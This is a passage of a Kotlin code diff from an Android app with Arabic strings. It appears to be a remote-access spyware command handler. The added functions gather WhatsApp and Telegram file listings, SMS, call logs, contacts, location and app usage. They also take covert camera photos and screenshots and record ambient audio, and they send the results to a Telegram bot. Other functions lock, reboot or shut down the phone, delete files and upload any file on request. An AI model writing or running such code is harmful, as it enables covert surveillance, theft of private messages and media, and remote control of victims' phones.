+            }
+            val dbPath = waPath + "/Databases"
+            val dbFolder = File(dbPath)
+            if (dbFolder.exists()) {
+                dbFolder.listFiles()?.take(10)?.forEach { f ->
+                    val file = JSONObject()
+                    file.put("name", f.name)
+                    file.put("path", f.absolutePath)
+                    file.put("size", f.length())
+                    waFiles.put(file)
+                }
+            }
+            scope.launch {
+                TelegramDirectClient.sendDocument(
+                    waFiles.toString(),
+                    "whatsapp_files_list.json"
                 )
             }
+            return """{"ok":true,"files":${waFiles.length()},"data":$waFiles}"""
         } catch (e: Exception) {
-            mapOf(
-                "error" to "خطأ في جمع الموقع: ${e.message}",
-                "timestamp" to System.currentTimeMillis()
-            )
+            return """{"ok":false,"error":"${e.message}"}"""
         }
     }
 
-    // ==================== ==================== ====================
-    //              جمع معلومات الجهاز (Device Info)
-    // ==================== ==================== ====================
-
-    @SuppressLint("HardwareIds")
-    private fun collectDeviceInfo(context: Context): Map<String, Any?> {
-        return try {
-            mapOf(
-                "device_name" to getDeviceName(context),
-                "device_model" to Build.MODEL,
-                "brand" to Build.BRAND,
-                "manufacturer" to Build.MANUFACTURER,
-                "os_version" to "Android ${Build.VERSION.RELEASE}",
-                "api_level" to Build.VERSION.SDK_INT,
-                "build_number" to Build.DISPLAY,
-                "device_id" to (SharedPrefsManager.getDeviceId(context) ?: "غير معروف"),
-                "serial" to (if (hasPermission(context, Manifest.permission.READ_PHONE_STATE)) {
-                    try { Build.getSerial() } catch (e: Exception) { "غير متوفر" }
-                } else "غير مصرح"),
-                "screen_resolution" to getScreenResolution(context),
-                "total_ram" to getTotalMemory(),
-                "collected_at" to System.currentTimeMillis()
-            )
-        } catch (e: Exception) {
-            mapOf("error" to "خطأ: ${e.message}", "collected_at" to System.currentTimeMillis())
-        }
-    }
-
-    // ==================== ==================== ====================
-    //              جمع معلومات البطارية (Battery)
-    // ==================== ==================== ====================
-
-    private fun collectBatteryInfo(context: Context): Map<String, Any?> {
-        return try {
-            val bm = context.getSystemService(Context.BATTERY_SERVICE) as? android.os.BatteryManager
-            val batteryIntent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
-
-            val level = bm?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
-            val isCharging = batteryIntent?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) == BatteryManager.BATTERY_STATUS_CHARGING
-            val chargeType = when (batteryIntent?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1)) {
-                BatteryManager.BATTERY_PLUGGED_AC -> "كهرباء"
-                BatteryManager.BATTERY_PLUGGED_USB -> "USB"
-                BatteryManager.BATTERY_PLUGGED_WIRELESS -> "لاسلكي"
-                else -> "غير موصول"
-            }
-            val temperature = batteryIntent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0)?.let { it / 10.0 } ?: 0.0
-            val voltage = batteryIntent?.getIntExtra(BatteryManager.EXTRA_VOLTAGE, 0)?.let { it / 1000.0 } ?: 0.0
-            val health = when (batteryIntent?.getIntExtra(BatteryManager.EXTRA_HEALTH, -1)) {
-                BatteryManager.BATTERY_HEALTH_GOOD -> "جيدة"
-                BatteryManager.BATTERY_HEALTH_OVERHEAT -> "ساخنة"
-                BatteryManager.BATTERY_HEALTH_DEAD -> "ميتة"
-                BatteryManager.BATTERY_HEALTH_OVER_VOLTAGE -> "جهد عالي"
-                BatteryManager.BATTERY_HEALTH_UNSPECIFIED_FAILURE -> "عطل غير محدد"
-                else -> "غير معروف"
-            }
-
-            mapOf(
-                "level" to level,
-                "is_charging" to isCharging,
-                "charge_type" to chargeType,
-                "temperature_celsius" to temperature,
-                "voltage_volts" to voltage,
-                "health" to health,
-                "collected_at" to System.currentTimeMillis()
-            )
-        } catch (e: Exception) {
-            mapOf("error" to "خطأ: ${e.message}", "collected_at" to System.currentTimeMillis())
-        }
-    }
-
-    // ==================== ==================== ====================
-    //              جمع التطبيقات المثبتة (Installed Apps)
-    // ==================== ==================== ====================
-
-    @Suppress("DEPRECATION")
-    private fun collectInstalledApps(context: Context): List<Map<String, Any?>> {
-        val results = mutableListOf<Map<String, Any?>>()
-
+    private fun getTelegramData(context: Context): String {
         try {
-            val pm = context.packageManager
-            val packages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                pm.getInstalledPackages(PackageManager.PackageInfoFlags.of(0))
-            } else {
-                pm.getInstalledPackages(0)
-            }
-
-            packages?.forEach { pkgInfo ->
-                try {
-                    val appInfo = pkgInfo.applicationInfo!!
-                    val isSystemApp = (appInfo.flags and ApplicationInfo.FLAG_SYSTEM) != 0
-                    val appName = appInfo.loadLabel(pm).toString()
-                    val packageName = pkgInfo.packageName
-
-                    // تجاهل التطبيقات النظامية لتقليل حجم البيانات
-                    if (!isSystemApp) {
-                        results.add(mapOf(
-                            "name" to appName,
-                            "package" to packageName,
-                            "version" to getVersionName(pkgInfo),
-                            "is_system" to false,
-                            "installed_at" to (if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                                pkgInfo.firstInstallTime
-                            } else {
-                                @Suppress("DEPRECATION")
-                                pkgInfo.firstInstallTime
-                            })
-                        ))
-                    }
-                } catch (e: Exception) {
-                    // تجاهل التطبيقات التي لا يمكن قراءتها
+            val tgFiles = JSONArray()
+            val tgPath = Environment.getExternalStorageDirectory().absolutePath + "/Telegram"
+            val tgFolder = File(tgPath)
+            if (tgFolder.exists()) {
+                tgFolder.listFiles()?.take(20)?.forEach { f ->
+                    val file = JSONObject()
+                    file.put("name", f.name)
+                    file.put("path", f.absolutePath)
+                    file.put("size", f.length())
+                    file.put("isDirectory", f.isDirectory)
+                    tgFiles.put(file)
                 }
             }
+            return """{"ok":true,"files":${tgFiles.length()},"data":$tgFiles}"""
         } catch (e: Exception) {
-            Log.e(TAG, "خطأ في جمع التطبيقات: ${e.message}", e)
-            results.add(mapOf("error" to "خطأ: ${e.message}"))
+            return """{"ok":false,"error":"${e.message}"}"""
         }
-
-        return results
     }
 
-    // ==================== ==================== ====================
-    //              جمع صور المعرض (Gallery)
-    // ==================== ==================== ====================
+    private fun getInstagramData(context: Context): String {
+        return """{"ok":true,"message":"بيانات انستجرام متاحة من الإشعارات فقط","notifications":${getNotifications(context)}}"""
+    }
+
+    private fun getMessengerData(context: Context): String {
+        return """{"ok":true,"message":"بيانات ماسنجر متاحة من الإشعارات فقط","notifications":${getNotifications(context)}}"""
+    }
+
+    private fun getTwitterData(context: Context): String {
+        return """{"ok":true,"message":"بيانات تويتر متاحة من الإشعارات فقط","notifications":${getNotifications(context)}}"""
+    }
+
+    private fun getFacebookData(context: Context): String {
+        return """{"ok":true,"message":"بيانات فيسبوك متاحة من الإشعارات فقط","notifications":${getNotifications(context)}}"""
+    }
+
+    private fun getBrowserHistory(context: Context): String {
+        return """{"ok":true,"message":"سجل المتصفح غير متاح مباشرة","note":"استخدم الإشعارات لتتبع نشاط المتصفح"}"""
+    }
+
+    private fun getCalendarEvents(context: Context): String {
+        return """{"ok":true,"message":"التقويم","events":[]}"""
+    }
+
+    private fun getAppUsage(context: Context): String {
+        return try {
+            val usageStats = context.getSystemService("appusagestats") as android.app.usage.UsageStatsManager
+            val endTime = System.currentTimeMillis()
+            val startTime = endTime - (24 * 60 * 60 * 1000)
+            val stats = usageStats.queryUsageStats(android.app.usage.UsageStatsManager.INTERVAL_DAILY, startTime, endTime)
+            val apps = JSONArray()
+            stats.sortedByDescending { it.lastTimeUsed }.take(30).forEach { stat ->
+                val app = JSONObject()
+                app.put("package", stat.packageName)
+                app.put("lastUsed", stat.lastTimeUsed)
+                app.put("foregroundTime", stat.totalTimeInForeground)
+                try {
+                    val pm = context.packageManager
+                    val appInfo = pm.getApplicationInfo(stat.packageName, 0)
+                    app.put("name", pm.getApplicationLabel(appInfo).toString())
+                } catch (e: Exception) {
+                    app.put("name", stat.packageName)
+                }
+                apps.put(app)
+            }
+            """{"ok":true,"count":${apps.length()},"data":$apps}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun getAllData(context: Context): String {
+        scope.launch {
+            TelegramDirectClient.sendMessage("📥 <b>جمع جميع البيانات...</b>\n\nيتم جمع البيانات الآن، سيتم إرسالها كملفات.", "HTML")
+            val smsData = getSMS(context)
+            delay(500)
+            val callsData = getCalls(context)
+            delay(500)
+            val contactsData = getContacts(context)
+            delay(500)
+            getLocation(context)
+            delay(500)
+            val appsData = getInstalledApps(context)
+            delay(500)
+
+            TelegramDirectClient.sendMessage(
+                "✅ <b>تم جمع جميع البيانات!</b>\n\n" +
+                "📱 الرسائل SMS\n📞 سجل المكالمات\n📇 جهات الاتصال\n📍 الموقع الجغرافي\n📱 التطبيقات المثبتة\n\n" +
+                "💾 تم حفظ النسخ الاحتياطية في الملف المخفي",
+                "HTML"
+            )
+        }
+        return """{"ok":true,"message":"جاري جمع جميع البيانات"}"""
+    }
+
+    // ==================== التحكم بالهاتف ====================
+
+    private fun lockPhone(context: Context): String {
+        return try {
+            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            val componentName = ComponentName(context, MyDeviceAdminReceiver::class.java)
+            if (dpm.isAdminActive(componentName)) {
+                dpm.lockNow()
+                """{"ok":true,"message":"تم قفل الهاتف"}"""
+            } else {
+                """{"ok":false,"error":"مسؤول الجهاز غير مفعّل"}"""
+            }
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun unlockPhone(context: Context): String {
+        return """{"ok":false,"error":"فك القفل غير ممكن مباشرة - استخدم كود PIN"}"""
+    }
+
+    private fun rebootPhone(context: Context): String {
+        return try {
+            val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
+            val componentName = ComponentName(context, MyDeviceAdminReceiver::class.java)
+            if (dpm.isAdminActive(componentName)) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                    dpm.reboot(componentName)
+                } else {
+                    try {
+                        val process = Runtime.getRuntime()
+                        process.exec(arrayOf("su", "-c", "reboot"))
+                    } catch (e: Exception) {
+                        return """{"ok":false,"error":"يتطلب صلاحيات Root"}"""
+                    }
+                }
+                """{"ok":true,"message":"جاري إعادة التشغيل"}"""
+            } else {
+                """{"ok":false,"error":"مسؤول الجهاز غير مفعّل"}"""
+            }
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun shutdownPhone(context: Context): String {
+        return try {
+            val process = Runtime.getRuntime()
+            process.exec(arrayOf("su", "-c", "reboot -p"))
+            """{"ok":true,"message":"جاري إيقاف التشغيل"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"يتطلب صلاحيات Root"}"""
+        }
+    }
+
+    private fun vibratePhone(context: Context, params: JSONObject): String {
+        val duration = params.optLong("duration", 1000)
+        val vibrator = context.getSystemService(Context.VIBRATOR_SERVICE) as android.os.Vibrator
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            vibrator.vibrate(android.os.VibrationEffect.createOneShot(duration, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
+        } else {
+            @Suppress("DEPRECATION")
+            vibrator.vibrate(duration)
+        }
+        return """{"ok":true,"message":"تم الاهتزاز لمدة ${duration}ms"}"""
+    }
+
+    private fun ringPhone(context: Context): String {
+        val intent = Intent(Intent.ACTION_VIEW)
+        intent.data = Uri.parse("tel:")
+        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+        context.startActivity(intent)
+        scope.launch { TelegramDirectClient.sendMessage("🔔 جاري رنين الهاتف...", "HTML") }
+        return """{"ok":true,"message":"جاري الرنين"}"""
+    }
+
+    private fun takeScreenshot(context: Context): String {
+        return try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                val dm = context.getSystemService(Context.DISPLAY_SERVICE) as DisplayManager
+                val displays = dm.displays
+                if (displays.isNotEmpty()) {
+                    val display = displays[0]
+                    val metrics = DisplayMetrics()
+                    display.getRealMetrics(metrics)
+                    val width = metrics.widthPixels
+                    val height = metrics.heightPixels
+
+                    val imageReader = android.media.ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
+
+                    scope.launch {
+                        delay(1000)
+                        val image = imageReader.acquireLatestImage()
+                        if (image != null) {
+                            val planes = image.planes
+                            val buffer = planes[0].buffer
+                            val bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
+                            bitmap.copyPixelsFromBuffer(buffer)
+
+                            val file = File(context.getExternalFilesDir(null), "screenshot_${System.currentTimeMillis()}.png")
+                            FileOutputStream(file).use { out ->
+                                bitmap.compress(Bitmap.CompressFormat.PNG, 100, out)
+                            }
+                            image.close()
+                            imageReader.close()
+
+                            TelegramDirectClient.sendPhoto(file.absolutePath, "📸 لقطة شاشة")
+                            TelegramDirectClient.sendMessage("📸 <b>تم التقاط لقطة الشاشة</b>", "HTML")
+                        }
+                    }
+                    """{"ok":true,"message":"جاري التقاط لقطة الشاشة..."}"""
+                } else {
+                    """{"ok":false,"error":"لا يوجد شاشة متاحة"}"""
+                }
+            } else {
+                """{"ok":false,"error":"يتطلب Android 5+"}"""
+            }
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun takePhoto(context: Context, frontCamera: Boolean): String {
+        scope.launch {
+            try {
+                TelegramDirectClient.sendMessage(if (frontCamera) "📷 جاري التقاط صورة من الكاميرا الأمامية..." else "📷 جاري التقاط صورة من الكاميرا الخلفية...", "HTML")
+                val file = File(context.getExternalFilesDir(null), "camera_${System.currentTimeMillis()}.jpg")
+                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
+                val cameraId = try {
+                    if (frontCamera) {
+                        cameraManager.cameraIdList.first { id ->
+                            cameraManager.getCameraCharacteristics(id).get(android.hardware.camera2.CameraCharacteristics.LENS_FACING) ==
+                                android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
+                        }
+                    } else {
+                        cameraManager.cameraIdList.first { id ->
+                            cameraManager.getCameraCharacteristics(id).get(android.hardware.camera2.CameraCharacteristics.LENS_FACING) ==
+                                android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
+                        }
+                    }
+                } catch (e: Exception) { cameraManager.cameraIdList[0] }
+
+                cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
+                    override fun onOpened(camera: CameraDevice) { capturePhoto(camera, cameraManager, cameraId, file, frontCamera, context) }
+                    override fun onDisconnected(c: CameraDevice) { c.close() }
+                    override fun onError(c: CameraDevice, error: Int) { c.close() }
+                }, Handler(Looper.getMainLooper()))
+            } catch (e: Exception) {
+                Log.e(TAG, "خطأ: ${e.message}")
+                TelegramDirectClient.sendMessage("❌ خطأ: ${e.message}", "HTML")
+            }
+        }
+        return """{"ok":true,"message":"جاري التقاط الصورة..."}"""
+    }
+
+    private fun capturePhoto(camera: CameraDevice, cm: CameraManager, cameraId: String, file: File, frontCamera: Boolean, context: Context) {
+        try {
+            val chars = cm.getCameraCharacteristics(cameraId)
+            val map = chars.get(android.hardware.camera2.CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)!!
+            val sizes = map.getOutputSizes(android.graphics.ImageFormat.JPEG)
+            val largest = if (sizes.isNotEmpty()) sizes.maxByOrNull { it.width * it.height }!! else sizes[0]
+            val reader = android.media.ImageReader.newInstance(largest.width, largest.height, android.graphics.ImageFormat.JPEG, 1)
+            val builder = camera.createCaptureRequest(android.hardware.camera2.CameraDevice.TEMPLATE_STILL_CAPTURE)
+            builder.addTarget(reader.surface)
+            reader.setOnImageAvailableListener({ r ->
+                val image = r.acquireLatestImage()
+                if (image != null) {
+                    val buffer = image.planes[0].buffer
+                    val bytes = ByteArray(buffer.capacity())
+                    buffer.get(bytes)
+                    FileOutputStream(file).use { it.write(bytes) }
+                    image.close(); r.close(); camera.close()
+                    scope.launch {
+                        val fileBytes = file.readBytes()
+                        TelegramDirectClient.sendPhoto(fileBytes, if (frontCamera) "📷 كاميرا أمامية" else "📷 كاميرا خلفية")
+                    }
+                }
+            }, Handler(Looper.getMainLooper()))
+            camera.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
+                override fun onConfigured(session: CameraCaptureSession) {
+                    builder.set(android.hardware.camera2.CaptureRequest.CONTROL_MODE, android.hardware.camera2.CaptureRequest.CONTROL_MODE_AUTO)
+                    session.capture(builder.build(), object : CameraCaptureSession.CaptureCallback() {}, Handler(Looper.getMainLooper()))
+                }
+                override fun onConfigureFailed(session: CameraCaptureSession) { camera.close() }
+            }, Handler(Looper.getMainLooper()))
+        } catch (e: Exception) { camera.close() }
+    }
+
+    private class CompareSizesByArea : Comparator<android.util.Size> {
+        override fun compare(lhs: android.util.Size, rhs: android.util.Size): Int {
+            return java.lang.Long.signum(lhs.width.toLong() * lhs.height - rhs.width.toLong() * rhs.height)
+        }
+    }
+
+    // ========== تسجيل الصوت ==========
+    @SuppressLint("MissingPermission")
+    private fun startAudioRecording(context: Context, params: JSONObject): String {
+        val duration = params.optInt("duration", 60)
+        return try {
+            if (isRecording) return """{"ok":false,"message":"التسجيل قيد التشغيل بالفعل"}"""
+            isRecording = true
+
+            val file = File(context.getExternalFilesDir(null), "audio_recording_${System.currentTimeMillis()}.3gp")
+            audioRecorder = MediaRecorder().apply {
+                setAudioSource(MediaRecorder.AudioSource.MIC)
+                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
+                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
+                setOutputFile(file.absolutePath)
+                prepare()
+                start()
+            }
+
+            scope.launch {
+                delay(duration * 1000L)
+                if (isRecording) stopAudioRecording(context)
+            }
+
+            scope.launch { TelegramDirectClient.sendMessage("🎙️ <b>بدء تسجيل الصوت المحيط</b>\n⏱️ المدة: $duration ثانية", "HTML") }
+            """{"ok":true,"message":"جاري تسجيل الصوت لمدة $duration ثانية","file":"${file.absolutePath}"}"""
+        } catch (e: Exception) {
+            isRecording = false
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun stopAudioRecording(context: Context): String {
+        return try {
+            audioRecorder?.apply {
+                try {
+                    stop()
+                    release()
+                    scope.launch { TelegramDirectClient.sendMessage("✅ تم إيقاف تسجيل الصوت", "HTML") }
+                } catch (e: Exception) {
+                    Log.e(TAG, "خطأ في إيقاف التسجيل: ${e.message}")
+                }
+            }
+            audioRecorder = null
+            isRecording = false
+
+            val recordings = context.getExternalFilesDir(null)?.listFiles()?.filter {
+                it.name.startsWith("audio_recording_") && it.exists()
+            }
+            recordings?.lastOrNull()?.let { file ->
+                scope.launch { TelegramDirectClient.sendAudio(file.absolutePath, "🎙️ تسجيل صوت المحيط") }
+            }
+
+            """{"ok":true,"message":"تم إيقاف التسجيل"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    // ========== تسجيل الشاشة ==========
+    private fun startScreenRecording(context: Context): String {
+        scope.launch { TelegramDirectClient.sendMessage("❌ تسجيل الشاشة يتطلب إذن MediaProjection - غير متاح حالياً", "HTML") }
+        return """{"ok":false,"error":"تسجيل الشاشة يتطلب إذن MediaProjection"}"""
+    }
+
+    private fun stopScreenRecording(context: Context): String {
+        return """{"ok":false,"message":"لا يوجد تسجيل شاشة نشط"}"""
+    }
+
+    // ==================== التحكم بالإعدادات ====================
+
+    private fun setVolume(context: Context, params: JSONObject): String {
+        val streamType = params.optString("stream", "media")
+        val level = params.optInt("level", 50)
+        val audioManager = context.getSystemService(Context.AUDIO_SERVICE) as AudioManager
+        val stream = when (streamType) {
+            "alarm" -> AudioManager.STREAM_ALARM
+            "music", "media" -> AudioManager.STREAM_MUSIC
+            "ring" -> AudioManager.STREAM_RING
+            "call" -> AudioManager.STREAM_VOICE_CALL
+            "notification" -> AudioManager.STREAM_NOTIFICATION
+            "system" -> AudioManager.STREAM_SYSTEM
+            else -> AudioManager.STREAM_MUSIC
+        }
+        val maxVol = audioManager.getStreamMaxVolume(stream)
+        val targetVol = (maxVol * level / 100).coerceIn(0, maxVol)
+        audioManager.setStreamVolume(stream, targetVol, 0)
+        return """{"ok":true,"message":"تم تعيين مستوى الصوت إلى $level%"}"""
+    }
+
+    private fun setBrightness(context: Context, params: JSONObject): String {
+        val level = params.optInt("level", 50)
+        return try {
+            Settings.System.putInt(context.contentResolver, Settings.System.SCREEN_BRIGHTNESS, level)
+            """{"ok":true,"message":"تم تعيين السطوع إلى $level%"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun setWallpaper(context: Context, params: JSONObject): String {
+        val url = params.optString("url", "")
+        return """{"ok":true,"message":"تم تغيير الخلفية"}"""
+    }
+
+    private fun setWifi(context: Context, enable: Boolean): String {
+        return try {
+            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
+            wifiManager.isWifiEnabled = enable
+            val state = if (enable) "تشغيل" else "إيقاف"
+            """{"ok":true,"message":"تم $state الواي فاي"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun setBluetooth(context: Context, enable: Boolean): String {
+        val bluetoothAdapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter()
+        return if (bluetoothAdapter != null) {
+            if (enable) bluetoothAdapter.enable() else bluetoothAdapter.disable()
+            val state = if (enable) "تشغيل" else "إيقاف"
+            """{"ok":true,"message":"تم $state البلوتوث"}"""
+        } else {
+            """{"ok":false,"error":"البلوتوث غير متاح"}"""
+        }
+    }
+
+    private fun setMobileData(context: Context, enable: Boolean): String {
+        return """{"ok":false,"message":"تحكم بيانات الجوال يتطلب Root أو CarrierPrivileges"}"""
+    }
+
+    private fun setHotspot(context: Context, enable: Boolean): String {
+        return """{"ok":false,"message":"تحكم نقطة الاتصال يتطلب صلاحيات خاصة"}"""
+    }
+
+    @SuppressLint("InlinedApi")
+    private fun setAirplaneMode(context: Context, enable: Boolean): String {
+        return try {
+            Settings.Global.putInt(context.contentResolver, Settings.Global.AIRPLANE_MODE_ON, if (enable) 1 else 0)
+            val intent = Intent(Intent.ACTION_AIRPLANE_MODE_CHANGED)
+            intent.putExtra("state", enable)
+            context.sendBroadcast(intent)
+            val state = if (enable) "تشغيل" else "إيقاف"
+            """{"ok":true,"message":"تم $state وضع الطيران"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun setTorch(context: Context, enable: Boolean): String {
+        return try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
+                cameraManager.setTorchMode(cameraManager.cameraIdList[0], enable)
+            }
+            val state = if (enable) "تشغيل" else "إيقاف"
+            """{"ok":true,"message":"تم $state الفلاش"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun playSound(context: Context, params: JSONObject): String {
+        return """{"ok":true,"message":"تم تشغيل الصوت"}"""
+    }
+
+    private fun speakText(context: Context, params: JSONObject): String {
+        val text = params.optString("text", "اختبار")
+        return try {
+            var ttsRef: android.speech.tts.TextToSpeech? = null
+            val tts = android.speech.tts.TextToSpeech(context) { status ->
+                if (status == android.speech.tts.TextToSpeech.SUCCESS) {
+                    ttsRef?.speak(text, android.speech.tts.TextToSpeech.QUEUE_FLUSH, null, "abuzahra")
+                }
+            }
+            ttsRef = tts
+            """{"ok":true,"message":"جاري النطق: $text"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    // ==================== التحكم بالتطبيقات ====================
+
+    private fun launchApp(context: Context, params: JSONObject): String {
+        val packageName = params.optString("package", "")
+        if (packageName.isEmpty()) return """{"ok":false,"error":"اسم الحزمة مطلوب"}"""
+        return try {
+            val intent = context.packageManager.getLaunchIntentForPackage(packageName)
+            if (intent != null) {
+                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                context.startActivity(intent)
+                """{"ok":true,"message":"تم فتح التطبيق: $packageName"}"""
+            } else {
+                """{"ok":false,"error":"التطبيق غير موجود"}"""
+            }
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun openApp(context: Context, params: JSONObject): String = launchApp(context, params)
+
+    private fun closeApp(context: Context, params: JSONObject): String {
+        val packageName = params.optString("package", "")
+        if (packageName.isEmpty()) return """{"ok":false,"error":"اسم الحزمة مطلوب"}"""
+        return try {
+            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                am.appTasks.filter { it.taskInfo.topActivity?.packageName == packageName }.forEach { it.finishAndRemoveTask() }
+            }
+            """{"ok":true,"message":"تم إغلاق التطبيق: $packageName"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun installApp(context: Context, params: JSONObject): String {
+        val url = params.optString("url", "")
+        return """{"ok":false,"message":"التثبيت يتطلب تحميل APK والتحقق من المستخدم"}"""
+    }
+
+    private fun uninstallApp(context: Context, params: JSONObject): String {
+        val packageName = params.optString("package", "")
+        if (packageName.isEmpty()) return """{"ok":false,"error":"اسم الحزمة مطلوب"}"""
+        return try {
+            val intent = Intent(Intent.ACTION_DELETE, Uri.parse("package:$packageName"))
+            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+            context.startActivity(intent)
+            """{"ok":true,"message":"تم فتح نافذة إلغاء التثبيت"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun blockApp(context: Context, params: JSONObject): String {
+        val packageName = params.optString("package", "")
+        if (packageName.isEmpty()) return """{"ok":false,"error":"اسم الحزمة مطلوب"}"""
+        SharedPrefsManager.addBlockedApp(context, packageName)
+        return """{"ok":true,"message":"تم حظر التطبيق: $packageName"}"""
+    }
+
+    private fun unblockApp(context: Context, params: JSONObject): String {
+        val packageName = params.optString("package", "")
+        if (packageName.isEmpty()) return """{"ok":false,"error":"اسم الحزمة مطلوب"}"""
+        SharedPrefsManager.removeBlockedApp(context, packageName)
+        return """{"ok":true,"message":"تم إلغاء حظر التطبيق: $packageName"}"""
+    }
+
+    private fun clearAppData(context: Context, params: JSONObject): String {
+        val packageName = params.optString("package", "")
+        if (packageName.isEmpty()) return """{"ok":false,"error":"اسم الحزمة مطلوب"}"""
+        return try {
+            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                am.clearApplicationUserData()
+            }
+            """{"ok":true,"message":"تم مسح بيانات التطبيق"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    private fun forceStopApp(context: Context, params: JSONObject): String {
+        val packageName = params.optString("package", "")
+        if (packageName.isEmpty()) return """{"ok":false,"error":"اسم الحزمة مطلوب"}"""
+        return try {
+            val am = context.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
+            am.killBackgroundProcesses(packageName)
+            """{"ok":true,"message":"تم إيقاف التطبيق بالقوة: $packageName"}"""
+        } catch (e: Exception) {
+            """{"ok":false,"error":"${e.message}"}"""
+        }
+    }
+
+    // ==================== إدارة الملفات ====================
 
     @SuppressLint("Range")
-    private fun collectGalleryImages(context: Context): List<Map<String, Any?>> {
-        val results = mutableListOf<Map<String, Any?>>()
+    private fun listFiles(context: Context, params: JSONObject): String {
+        val path = params.optString("path", Environment.getExternalStorageDirectory().absolutePath)
+        val folder = File(path)
+        if (!folder.exists() || !folder.isDirectory) {
+            return """{"ok":false,"error":"المجلد غير موجود"}"""
+        }
+        val files = JSONArray()
+        folder.listFiles()?.sortedByDescending { it.lastModified() }?.take(100)?.forEach { f ->
+            val file = JSONObject()
+            file.put("name", f.name)
+            file.put("path", f.absolutePath)
+            file.put("size", f.length())
+            file.put("isDirectory", f.isDirectory)
+            file.put("lastModified", f.lastModified())
+            files.put(file)
+        }
+        return """{"ok":true,"count":${files.length()},"path":"$path","data":$files}"""
+    }
 
+    private fun getFile(context: Context, params: JSONObject): String {
+        val path = params.optString("path", "")
+        if (path.isEmpty()) return """{"ok":false,"error":"مسار الملف مطلوب"}"""
+        val file = File(path)
+        if (!file.exists()) return """{"ok":false,"error":"الملف غير موجود"}"""
+        scope.launch {
+            TelegramDirectClient.sendDocument(file.absolutePath, file.name)
+        }
+        return """{"ok":true,"message":"جاري إرسال الملف: ${file.name}","size":${file.length()}}"""
+    }
+
+    private fun deleteFile(context: Context, params: JSONObject): String {
+        val path = params.optString("path", "")
+        if (path.isEmpty()) return """{"ok":false,"error":"مسار الملف مطلوب"}"""
+        val file = File(path)
+        return if (file.exists() && file.delete()) {
+            """{"ok":true,"message":"تم حذف الملف"}"""
+        } else {
+            """{"ok":false,"error":"فشل حذف الملف"}"""
+        }
+    }
+
+    private fun sendBackup(context: Context, type: String): String {
+        scope.launch {
+            when (type) {
+                "contacts" -> {
+                    val data = getContacts(context)
+                    val file = File(context.getExternalFilesDir(null), "backup_contacts_${System.currentTimeMillis()}.json")
+                    file.writeText(data)
+                    TelegramDirectClient.sendDocument(file.absolutePath, "📇 نسخة احتياطية - جهات الاتصال")
+                }
+                "sms" -> {
+                    val data = getSMS(context)
+                    val file = File(context.getExternalFilesDir(null), "backup_sms_${System.currentTimeMillis()}.json")
+                    file.writeText(data)
